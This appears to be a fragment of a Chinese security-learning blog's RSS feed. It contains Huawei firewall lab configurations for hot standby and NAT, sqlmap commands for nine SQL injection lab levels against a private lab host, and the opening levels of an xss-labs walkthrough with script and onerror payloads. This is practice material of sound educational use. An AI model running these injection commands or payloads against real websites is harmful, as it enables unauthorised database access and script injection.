&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 active &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 active &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]hrp interface Eth-Trunk 18 remote 10.1.1.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]hrp enable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;FW2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/1]vrrp vrid 1 virtual-ip 192.168.1.254 24 standby&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]vrrp vrid 2 virtual-ip 20.1.1.254 24 standby &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG2]hrp interface Eth-Trunk 18 remote 10.1.1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG2]hrp enable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;5.最后便是写安全策略进行验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1]security-policy  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security]rule name 1 (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]source-zone trust  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]destination-zone untrust  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]action permit  (+B)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security-rule-1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HRP_M[USG1-policy-security]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/</guid>
            <title>防火墙业务管理（NAT）</title>
            <link>https://w-sqrt7.github.io/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Sun, 05 May 2024 19:26:54 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;防火墙业务管理（NAT）&#34;&gt;&lt;a href=&#34;#防火墙业务管理（NAT）&#34; class=&#34;headerlink&#34; title=&#34;防火墙业务管理（NAT）&#34;&gt;&lt;/a&gt;防火墙业务管理（NAT）&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图：&#34;&gt;&lt;a href=&#34;#实验拓扑图：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图：&#34;&gt;&lt;/a&gt;实验拓扑图：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505181810396.png&#34; alt=&#34;image-20240505181810396&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先是将各个pc以及端口配置对应的ip&lt;/p&gt;
&lt;p&gt;2.然后开始配置防火墙，接口ip配置完成后加入对应的安全区域&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone trust &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]add interface g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-trust]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]firewall zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]add interface g1/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-zone-untrust]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后配置防火墙的转发策略&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]security-policy &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security]rule name 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]source-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]destination-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-security-rule-1]action permit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后配置NAT地址池&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]nat address-group pool1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-address-group-pool1]section 192.168.18.5 192.168.18.18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后配置NAT策略&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]nat-policy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-nat]rule name source-nat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-nat-rule-source-nat]source-zone trust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-nat-rule-source-nat]destination-zone untrust&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1-policy-nat-rule-source-nat]action source-nat address-group pool1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;由于公网上有多个网段，防火墙上需要添加缺省路由&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW1]ip route-static 0.0.0.0 0.0.0.0 192.168.18.2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.最后进行成果验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PC&amp;gt;ping 192.168.19.1 -t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW1]disp firewall session table&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505183716045.png&#34; alt=&#34;image-20240505183716045&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</guid>
            <title></title>
            <link>https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</link>
            <pubDate>Thu, 02 May 2024 11:04:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sqlmap基础使用&#34;&gt;&lt;a href=&#34;#sqlmap基础使用&#34; class=&#34;headerlink&#34; title=&#34;sqlmap基础使用&#34;&gt;&lt;/a&gt;sqlmap基础使用&lt;/h1&gt;&lt;h2 id=&#34;第一关&#34;&gt;&lt;a href=&#34;#第一关&#34; class=&#34;headerlink&#34; title=&#34;第一关&#34;&gt;&lt;/a&gt;第一关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example1.php?name=root&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --batch --random-agent&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225539554.png&#34; alt=&#34;image-20240501225539554&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二关&#34;&gt;&lt;a href=&#34;#第二关&#34; class=&#34;headerlink&#34; title=&#34;第二关&#34;&gt;&lt;/a&gt;第二关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example2.php?name=root&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --batch --random-agent --tamper=space2comment -v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225606261.png&#34; alt=&#34;image-20240501225606261&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第三关&#34;&gt;&lt;a href=&#34;#第三关&#34; class=&#34;headerlink&#34; title=&#34;第三关&#34;&gt;&lt;/a&gt;第三关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example3.php?name=root&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --batch --random-agent --tamper=space2comment -v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225717778.png&#34; alt=&#34;image-20240501225717778&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第四关&#34;&gt;&lt;a href=&#34;#第四关&#34; class=&#34;headerlink&#34; title=&#34;第四关&#34;&gt;&lt;/a&gt;第四关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example4.php?id=2&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --batch --random-agent&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225952121.png&#34; alt=&#34;image-20240501225952121&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第五关&#34;&gt;&lt;a href=&#34;#第五关&#34; class=&#34;headerlink&#34; title=&#34;第五关&#34;&gt;&lt;/a&gt;第五关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example5.php?id=2&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --batch --random-agent&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501230040354.png&#34; alt=&#34;image-20240501230040354&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第六关&#34;&gt;&lt;a href=&#34;#第六关&#34; class=&#34;headerlink&#34; title=&#34;第六关&#34;&gt;&lt;/a&gt;第六关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;第七关&#34;&gt;&lt;a href=&#34;#第七关&#34; class=&#34;headerlink&#34; title=&#34;第七关&#34;&gt;&lt;/a&gt;第七关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example7.php?id=2%0A&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --random-agent --batch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501234453233.png&#34; alt=&#34;image-20240501234453233&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第八关&#34;&gt;&lt;a href=&#34;#第八关&#34; class=&#34;headerlink&#34; title=&#34;第八关&#34;&gt;&lt;/a&gt;第八关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example8.php?order=name&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --random-agent --dbms=mysql --batch --level 4 --risk 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501232909037.png&#34; alt=&#34;image-20240501232909037&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第九关&#34;&gt;&lt;a href=&#34;#第九关&#34; class=&#34;headerlink&#34; title=&#34;第九关&#34;&gt;&lt;/a&gt;第九关&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python sqlmap.py -u &amp;quot;http://192.168.100.155/sqli/example9.php?order=name&amp;quot; --output-dir=&amp;quot;E:\Tool\tool\SQLmap\output&amp;quot; --random-agent --dbms=mysql --batch --level 5 --risk 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501233326481.png&#34; alt=&#34;image-20240501233326481&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</guid>
            <title>XSS-labs通关记录</title>
            <link>https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>xss-labs</category>
            <pubDate>Wed, 01 May 2024 13:32:35 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xss-labs通关记录&#34;&gt;&lt;a href=&#34;#xss-labs通关记录&#34; class=&#34;headerlink&#34; title=&#34;xss-labs通关记录&#34;&gt;&lt;/a&gt;xss-labs通关记录&lt;/h1&gt;&lt;h2 id=&#34;第一关&#34;&gt;&lt;a href=&#34;#第一关&#34; class=&#34;headerlink&#34; title=&#34;第一关&#34;&gt;&lt;/a&gt;第一关&lt;/h2&gt;&lt;p&gt;这一关没有做出任何的过滤，直接传入payload即可&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;127.0.0.1:90/xss-labs/level1.php?name=&amp;lt;script&amp;gt;alert(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430201556793.png&#34; alt=&#34;image-20240430201556793&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二关&#34;&gt;&lt;a href=&#34;#第二关&#34; class=&#34;headerlink&#34; title=&#34;第二关&#34;&gt;&lt;/a&gt;第二关&lt;/h2&gt;&lt;p&gt;先尝试直接传入payload，观察结果发现并没有成功，查看页面源代码，可以看到特殊符号被转义了，可通过传入value中内容，利用  “&amp;gt;  进行语句闭合，执行payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20201732-1714479821209.png&#34; alt=&#34;屏幕截图 2024-04-30 201732&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert(&amp;#x27;xss&amp;#x27;)&amp;lt;/script&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;img src=&amp;#x27;777&amp;#x27; onerror=alert()&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

